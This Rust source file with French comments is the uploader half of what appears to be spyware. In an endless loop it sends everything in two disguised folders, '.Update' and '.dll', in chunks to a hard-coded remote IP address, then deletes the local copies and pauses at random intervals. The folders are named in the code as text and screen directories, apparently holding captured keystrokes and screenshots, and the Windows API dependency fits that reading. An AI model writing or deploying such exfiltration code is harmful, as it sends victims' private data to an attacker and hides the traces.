// Cargo.toml (à la racine du package `sending`)
// [package]
// name = "sending"
// version = "0.1.0"
// edition = "2021"
//
// [dependencies]
// reqwest = { version = "0.11", features = ["blocking"] }
// anyhow = "1.0"
// rand = "0.8"
// chrono = "0.4"
// winapi = { version = "0.3.7", features = ["winuser", "regapi"] }

use anyhow::Result;
use chrono::Local;
use rand::{thread_rng, Rng};
use reqwest::blocking::Client;
use std::{
    fs::{self, File},
    io::{Read, Write},
    path::Path,
    thread,
    time::Duration,
};

const SERVER_URL: &str = "http://144.172.84.133:8080"; // ton serveur/ngrok
const CHUNK_SIZE: usize = 1024 * 1024; // 1 Mo

fn send_file_in_chunks(client: &Client, file_path: &Path, file_type: &str) -> Result<bool> {
    let mut file = File::open(file_path)?;
    let mut buffer = Vec::new();
    file.read_to_end(&mut buffer)?;

    let total_chunks = (buffer.len() + CHUNK_SIZE - 1) / CHUNK_SIZE;
    let filename = file_path.file_name().unwrap().to_string_lossy();

    for idx in 0..total_chunks {
        let start = idx * CHUNK_SIZE;
        let end = (start + CHUNK_SIZE).min(buffer.len());
        let chunk = &buffer[start..end];

        let resp = client
            .post(SERVER_URL)
            .header("X-Filename", filename.to_string())
            .header("X-File-Type", file_type)
            .header("X-Segment-Number", idx.to_string())
            .header("X-Total-Segments", total_chunks.to_string())
            .body(chunk.to_vec())
            .send()?;

        if !resp.status().is_success() {
            eprintln!("❌  Erreur chunk {}/{} ({})", idx + 1, total_chunks, resp.status());
            return Ok(false);
        }
        // petite pause pour ne pas spammer
        thread::sleep(Duration::from_millis(50));
    }

    println!("✔️  Fichier '{}' envoyé en {} morceaux", filename, total_chunks);
    Ok(true)
}

/// Envoie tous les fichiers d’un dossier, supprime chaque fichier envoyé
fn send_dir(dir: &str) {
    let client = Client::new();
    if let Ok(entries) = fs::read_dir(dir) {
        for entry in entries.flatten() {
            let path = entry.path();
            if path.is_file() {
                let file_type = if dir.contains("Update") {
                    "Update"
                } else {
                    ".dll"
                };
                match send_file_in_chunks(&client, &path, file_type) {
                    Ok(true) => {
                        // suppression du fichier local
                        if fs::remove_file(&path).is_ok() {
                            println!("🗑️  Fichier local supprimé: {}", path.display());
                        }
                    }
                    Ok(false) | Err(_) => {
                        eprintln!("⚠️  Envoi échoué ou partiel pour {}", path.display());
                    }
                }
            }
        }
    }
}

fn main() -> Result<()> {
    let text_dir = ".Update";
    let screen_dir = ".dll";

    loop {
        println!("🕒 [{}] Nouveau cycle d'envoi…", Local::now());
        send_dir(text_dir);
        send_dir(screen_dir);

        // recréer les dossiers s’ils ont disparu
        fs::create_dir_all(text_dir).ok();
        fs::create_dir_all(screen_dir).ok();

        // pause aléatoire entre 10 et 15 s
        let pause = thread_rng().gen_range(10..15);
        println!("⏸️  Pause de {} secondes", pause);
        thread::sleep(Duration::from_secs(pause));
    }
}
